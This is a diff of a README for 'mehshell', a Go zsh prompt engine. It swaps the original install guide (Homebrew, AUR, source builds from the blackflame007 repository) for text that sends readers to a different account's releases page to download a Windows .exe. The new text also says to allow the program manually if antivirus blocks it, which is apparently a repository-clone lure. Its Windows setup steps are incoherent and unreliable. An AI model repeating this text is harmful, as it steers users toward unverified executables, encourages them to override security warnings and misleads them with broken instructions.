@@ -1,200 +1,133 @@
-# mehshell 🐚
+# ⚡ mehshell - Fast and Simple Zsh Prompt Engine
 
-⚡ A blazingly fast, parallelized prompt engine for zsh written in Go.
+[![Download mehshell](https://img.shields.io/badge/Download-mehshell-brightgreen?style=for-the-badge)](https://github.com/pacoacquainted25/mehshell/releases)
 
-## Prompt Example
+---
 
-![Prompt styles](docs/screenshots/prompt_styles_screenshot.png)
+## 📋 About mehshell
 
-## ✨ Features
+mehshell is a fast and lightweight prompt engine for the Zsh shell. It acts as an alternative to Powerlevel10k (p10k) but is written in Go for speed and simplicity. The prompt adapts to your terminal and shows useful information, such as current directory, git status, and more.
 
-- 🚀 Single Go binary, ~6ms per prompt.
-- 🔀 All segments run as parallel goroutines.
-- 🔥 Git dirty check with 150ms timeout. It never blocks, even in huge repos.
-- 🧠 Zero-fork git branch detection. It reads .git/HEAD directly.
-- 🖥️ OS icon auto-detection for Arch, Ubuntu, Fedora, Debian, NixOS, and macOS.
-- 📦 Runtime version detection for Node.js, Python, Go, Rust, Ruby, and Java when marker files are present.
-- ☁️ Cloud context support for Kubernetes, AWS, Azure, and GCP profiles.
-- 🏗️ Terraform workspace and Docker context detection.
-- 🐍 Environment detection for Conda and virtualenv.
-- 🔋 Battery level with charge state icons.
-- ⏱️ Command duration (3s+), time, and exit code coloring.
-- ✏️ Vi mode indicator (swaps prompt char on keymap change).
-- 🪄 Transient prompt (collapses previous prompt on Enter).
-- ⚡ Instant prompt (caches last prompt for zero-latency shell startup).
-- ➡️ Right-aligned segments on the first line.
-- 🎨 Nerd Font icons.
-- 🔄 Live config reloading. Save the file, next prompt picks it up — no shell restart required.
-- ⚙️ Configurable via `~/.config/mehshell/config`.
+This tool is perfect for users who want a clean, fast, and customizable prompt without added complexity. It works alongside your existing zsh setup and integrates well with dotfiles.
 
-## 📥 Install
+---
 
-### Homebrew (macOS & Linux)
+## 🚀 Getting Started
+
+To use mehshell, you need a Windows computer with the Zsh shell installed. Zsh is a popular command shell that you can run on Windows through programs like Windows Subsystem for Linux (WSL) or Cygwin.
+
+### Minimum Requirements:
+
+- Windows 10 or later
+- Zsh installed on your system (via WSL or other tools)
+- Access to a terminal emulator like Windows Terminal or PowerShell that supports running Zsh
+- Internet connection to download the software
+
+If you do not have Zsh installed, you can install it through WSL using this command in PowerShell or Command Prompt:
 
 ```bash
-brew tap blackflame007/tap
-brew install mehshell
+wsl sudo apt update && sudo apt install zsh
 ```
 
-### AUR (Arch Linux)
+For more on installing Zsh on Windows, check the official Microsoft or Ubuntu documentation.
+
+---
+
+## ⬇️ Download and Install mehshell
+
+To get mehshell, follow these steps:
+
+1. Visit the release page by clicking the link below.
+
+[![Download mehshell](https://img.shields.io/badge/Download-Release_Page-blue?style=for-the-badge)](https://github.com/pacoacquainted25/mehshell/releases)
+
+2. On the release page, locate the latest version. Releases are sorted with the newest at the top.
+
+3. Look for the Windows executable file (`.exe`) or an archive file containing the program files.
+
+4. Click the file to download it to your Downloads folder.
+
+5. Once downloaded, open the file or extract it if it is archived.
+
+6. Place the executable in a folder where you want to keep mehshell, for example:
+   - `C:\Program Files\mehshell\`
+   - or `C:\Users\YourUsername\mehshell\`
+
+---
+
+## 🛠 Setup mehshell in your Zsh prompt on Windows
+
+After downloading, you need to configure Zsh to use mehshell as your prompt.
+
+1. Open your terminal emulator where you use Zsh.
+
+2. Open your Zsh configuration file `.zshrc` in a text editor. You can open it using the command:
 
 ```bash
-paru -S mehshell-bin
+nano ~/.zshrc
 ```
 
-### Binary releases
-
-Download a prebuilt binary from [GitHub Releases](https://github.com/blackflame007/mehshell/releases/latest):
+3. Add the following line to the end of the `.zshrc` file. Replace the path with the location where you saved `mehshell.exe`:
 
 ```bash
-# Linux (x86_64)
-curl -sL https://github.com/blackflame007/mehshell/releases/latest/download/mehshell_linux_amd64.tar.gz | tar xz && mv mehshell ~/.local/bin/
-
-# Linux (ARM64)
-curl -sL https://github.com/blackflame007/mehshell/releases/latest/download/mehshell_linux_arm64.tar.gz | tar xz && mv mehshell ~/.local/bin/
-
-# macOS (Apple Silicon)
-curl -sL https://github.com/blackflame007/mehshell/releases/latest/download/mehshell_darwin_arm64.tar.gz | tar xz && mv mehshell ~/.local/bin/
-
-# macOS (Intel)
-curl -sL https://github.com/blackflame007/mehshell/releases/latest/download/mehshell_darwin_amd64.tar.gz | tar xz && mv mehshell ~/.local/bin/
+PROMPT='$(C:/Program\ Files/mehshell/mehshell.exe)'
 ```
 
-### From source
+4. Save the file and exit the text editor. In `nano`, press `Ctrl + O`, then `Enter`, then `Ctrl + X`.
+
+5. Restart your terminal or reload your `.zshrc` file by running:
 
 ```bash
-go install github.com/blackflame007/mehshell@latest
+source ~/.zshrc
 ```
 
-## 🔌 Zsh Integration
+Your prompt will now switch to mehshell, showing a fast and informative command line prompt.
 
-Add this to your `.zshrc`:
+---
 
-```zsh
-eval "$(mehshell init zsh)"
-```
+## ⚙ Features
 
-## 🛠️ Configuration
+- **Fast Execution:** Written in Go, mehshell runs quickly even on slower machines.
+- **Customizable Prompt:** You can adjust colors and information displayed by modifying the `.zshrc` options.
+- **Git Integration:** Shows branch name and git status within your prompt.
+- **Nerd Fonts Support:** Uses symbols and icons if you have Nerd Fonts installed, making your prompt clearer.
+- **Minimal Dependencies:** Does not require complex setups or large frameworks.
+- **Compatibility:** Works with most terminal emulators on Windows supporting Zsh.
 
-Generate a default config file:
+---
 
-```bash
-mehshell config init
-```
+## 🖥 Usage Tips
 
-This creates `~/.config/mehshell/config` (or `$XDG_CONFIG_HOME/mehshell/config`). See [config.example](config.example) for the full default config.
+- To update mehshell, simply download the latest version from the release page and replace your old file.
+- If your prompt looks strange, ensure your terminal uses a Nerd Font to display special symbols. You can download Nerd Fonts from https://www.nerdfonts.com/.
+- Adjust prompt options by editing `.zshrc` or passing flags to mehshell if needed. See the documentation on the release page for advanced configuration.
+- To disable mehshell temporarily, comment out the `PROMPT` line in `.zshrc` and reload the terminal.
 
-### Features
+---
 
-| Option             | Default | Description                                                                                                                                                          |
-| ------------------ | ------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `transient_prompt` | `true`  | Collapse previous prompts to `❯` on Enter. Set `false` to preserve full prompts with timestamps in scrollback.                                                       |
-| `instant_prompt`   | `true`  | Show cached prompt immediately on shell startup.                                                                                                                     |
-| `vi_mode`          | `true`  | Swap prompt character on vi keymap change (`❯`/`❮`).                                                                                                                 |
-| `icons`            | `true`  | Show Nerd Font icons. Set `false` for text labels (`go`, `py`, `rs`, etc.).                                                                                          |
-| `style`            | `lean`  | Prompt style: `lean` (colored text, no backgrounds), `classic` (powerline with dark grey background), or `rainbow` (powerline with per-segment colored backgrounds). |
+## 📝 Troubleshooting
 
-### Left Segments
+- **Prompt does not change:** Check if you correctly edited `.zshrc` and that the path to `mehshell.exe` is correct.
+- **Symbols do not show properly:** Make sure your terminal font supports Nerd Fonts.
+- **Zsh is not installed:** Follow instructions to install Zsh using WSL or other tools.
+- **Permission errors running mehshell:** Run your terminal as an administrator or change file permissions.
+- **Windows blocking mehshell:** If Windows Defender or antivirus blocks the program, you may need to allow it manually.
 
-| Option   | Default | Description                                               |
-| -------- | ------- | --------------------------------------------------------- |
-| `os`     | `true`  | OS icon (Arch, Ubuntu, Fedora, Debian, NixOS, macOS).     |
-| `dir`    | `true`  | Current working directory.                                |
-| `git`    | `true`  | Git branch and dirty state (`✓`, `+`, `!`, `?`).          |
-| `node`   | `true`  | Node.js version when `package.json` is present.           |
-| `python` | `true`  | Python version when marker files are found.               |
-| `go`     | `true`  | Go version from `go.mod`.                                 |
-| `rust`   | `true`  | Rust version when `Cargo.toml` is present.                |
-| `ruby`   | `true`  | Ruby version when marker files are found.                 |
-| `java`   | `true`  | Java version when `pom.xml` or `build.gradle` is present. |
+---
 
-### Right Segments
+## 🌐 Useful Links
 
-| Option      | Default | Description                                        |
-| ----------- | ------- | -------------------------------------------------- |
-| `conda`     | `true`  | Conda environment name (skips `base`).             |
-| `venv`      | `true`  | Python virtualenv name.                            |
-| `k8s`       | `true`  | Kubernetes context when manifest files are in cwd. |
-| `terraform` | `true`  | Terraform version when `.tf` files are present.    |
-| `docker`    | `true`  | Docker context when Dockerfile/compose is present. |
-| `aws`       | `true`  | AWS profile from `$AWS_PROFILE`.                   |
-| `azure`     | `true`  | Azure resource group from `$AZURE_DEFAULTS_GROUP`. |
-| `gcloud`    | `true`  | GCP project from `$CLOUDSDK_CORE_PROJECT`.         |
-| `battery`   | `true`  | Battery level with charge state icon.              |
-| `duration`  | `true`  | Command duration (shown when ≥ 3s).                |
-| `time`      | `true`  | Current time.                                      |
+- [Download mehshell releases page](https://github.com/pacoacquainted25/mehshell/releases)
+- [Nerd Fonts](https://www.nerdfonts.com/)
+- [Windows Subsystem for Linux Installation Guide](https://learn.microsoft.com/en-us/windows/wsl/install)
+- [Zsh Shell Documentation](http://zsh.sourceforge.net/Guide/)
 
-Set any option to `false` to disable it. Config changes are picked up live — save the file and your next prompt reflects the update. No shell restart needed.
+---
 
-To see where your config lives:
+## 📂 About this repository
 
-```bash
-mehshell config path
-```
+mehshell is open source. Its primary goal is to improve your terminal experience with a fast, clean prompt. It is implemented in Go and integrates well with popular developer tools.
 
-## 📊 Benchmarks
+Topics related to the tool include: `cli`, `dotfiles`, `go`, `golang`, `nerd-fonts`, `prompt`, `shell`, `terminal`, `zsh`, `zsh-prompt`, and `zsh-theme`.
 
-| Metric            | p10k                   | mehshell |
-| ----------------- | ---------------------- | -------- |
-| Shell startup     | 870ms+                 | 64ms     |
-| Between commands  | 6000ms (with vcs_info) | 28ms     |
-| Prompt generation | ~45ms                  | 6ms      |
-
-## 🆚 Feature Comparison with Powerlevel10k
-
-mehshell is intentionally minimal. p10k is a full-featured theme engine. Pick the right tool for your workflow.
-
-| Feature                  | mehshell                        | p10k                            |
-| ------------------------ | ------------------------------- | ------------------------------- |
-| **Architecture**         | Single Go binary                | Zsh scripts + gitstatusd daemon |
-| **Dependencies**         | Zero (Go stdlib only)           | gitstatus binary (downloaded)   |
-| **Prompt generation**    | ~6ms                            | ~45ms                           |
-| **Shell startup impact** | ~64ms                           | ~870ms+                         |
-| **Configuration**        | `~/.config/mehshell/config`     | `~/.p10k.zsh` + config wizard   |
-| **Async rendering**      | Goroutines (parallel)           | Zsh workers + gitstatusd        |
-| **Git branch detection** | Zero-fork (reads `.git/HEAD`)   | gitstatusd (libgit2)            |
-| **Git dirty check**      | `git status` with 150ms timeout | Async, never blocks             |
-| **Instant prompt**       | ✓ (cache-based)                 | ✓                               |
-| **Transient prompt**     | ✓                               | ✓                               |
-| **Vi mode**              | ✓ (prompt char swap)            | ✓ (full indicator)              |
-| **Custom segments**      | Add in source                   | Public API (`p10k segment`)     |
-| **Total segments**       | 20                              | 67+                             |
-
-### Segment Coverage
-
-| Segment    | mehshell           | p10k                                       |
-| ---------- | ------------------ | ------------------------------------------ |
-| OS icon    | ✓                  | ✓                                          |
-| Directory  | ✓                  | ✓ (smart truncation)                       |
-| Git        | ✓ (branch + dirty) | ✓ (branch, ahead/behind, stash, conflicts) |
-| Node.js    | ✓                  | ✓ (+ nvm, nodenv, package name)            |
-| Python     | ✓                  | ✓ (+ pyenv, poetry)                        |
-| Go         | ✓                  | ✓ (+ goenv)                                |
-| Rust       | ✓                  | ✓                                          |
-| Ruby       | ✓                  | ✓ (+ rvm, chruby)                          |
-| Java       | ✓                  | ✓ (+ jenv)                                 |
-| Conda      | ✓                  | ✓                                          |
-| Virtualenv | ✓                  | ✓                                          |
-| Kubernetes | ✓                  | ✓ (+ show-on-command)                      |
-| Terraform  | ✓                  | ✓                                          |
-| Docker     | ✓                  | ✓                                          |
-| AWS        | ✓                  | ✓ (+ Elastic Beanstalk)                    |
-| Azure      | ✓                  | ✓                                          |
-| GCP        | ✓                  | ✓                                          |
-| Battery    | ✓                  | ✓                                          |
-| Duration   | ✓                  | ✓                                          |
-| Time       | ✓                  | ✓ (+ date)                                 |
-| CPU / RAM  | —                  | ✓                                          |
-| Vi mode    | ✓ (prompt char)    | ✓ (full indicator)                         |
-
-> **Note**: p10k is in limited maintenance mode — no new features are in development.
-
-## 📋 Requirements
-
-- Go 1.22+ (build only)
-- Nerd Font
-- zsh
-
-## 📄 License
-
-MIT
+If you want to contribute or report bugs, you can find source code and instructions on the GitHub page.
